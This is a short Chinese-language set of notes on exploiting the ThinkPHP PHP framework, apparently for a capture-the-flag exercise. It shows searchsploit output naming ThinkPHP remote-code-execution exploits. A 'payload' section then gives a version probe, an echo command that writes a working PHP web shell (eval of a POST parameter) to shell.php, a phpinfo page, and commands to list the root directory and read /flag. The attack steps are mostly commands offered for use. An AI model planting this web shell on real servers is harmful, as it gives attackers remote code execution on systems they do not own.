# Thinkphp 漏洞利用

# 00X1 什么是thinkphp
ThinkPHP是一个免费开源的，快速、简单的面向对象的轻量级PHP开发框架
>**什么是web框架？**  
[web框架](https://blog.csdn.net/weixin_42976659/article/details/88187868?ops_request_misc=&request_id=&biz_id=102&utm_term=web%25E6%25A1%2586%25E6%259E%25B6&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-6-88187868.nonecase)  
>**什么是静态与动态网站？**  
[静态与动态网站](https://blog.csdn.net/liangmengbk/article/details/99176845?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522160889557916780296863195%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&request_id=160889557916780296863195&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-99176845.first_rank_v2_pc_rank_v29&utm_term=%E5%8A%A8%E6%80%81%E7%BD%91%E7%AB%99%E5%92%8C%E9%9D%99%E6%80%81%E7%BD%91%E7%AB%99%E5%8C%BA%E5%88%AB)

# 00X2 thinkphp 漏洞利用
### 工具
>**在线漏洞查询网站**  
[exploit database](https://www.exploit-db.com)

>**kali**  
searchsploit

```
┌──(sinon㉿kali)-[~]
└─$ searchsploit thinkphp
   
Exploit Title                          |  Path
---------------------------------------- ---------------------------------
ThinkPHP - Multiple PHP Injection RCEs  | linux/remote/48333.rb
ThinkPHP 2.0 - 'index.php' Cross-Site S | php/webapps/33933.txt
ThinkPHP 5.0.23/5.1.31 - Remote Code Ex | php/webapps/45978.txt
ThinkPHP 5.X - Remote Command Execution | php/webapps/46150.txt

```
```
┌──(sinon㉿kali)-[~]
└─$ cd /usr/share/exploitdb/exploits/php/webapps
┌──(sinon㉿kali)-[/usr/…/exploitdb/exploits/php/webapps]
└─$ gedit ***.txt
```
# 00X3 payload
### step1
>/?s=1  
**查看thinkphp版本**
### step2
>echo '\<?php highlight_file(\_\_FILE__);@eval($_POST["shell"]);?>'>shell.php  
**上🐎,验证成功上🐎**  

>echo '\<?php highlight_file(\_\_FILE__);@eval(phpinfo());?>'>info.php  
**查看info页面**

>ls /  
cat /flag  
**常规命令**
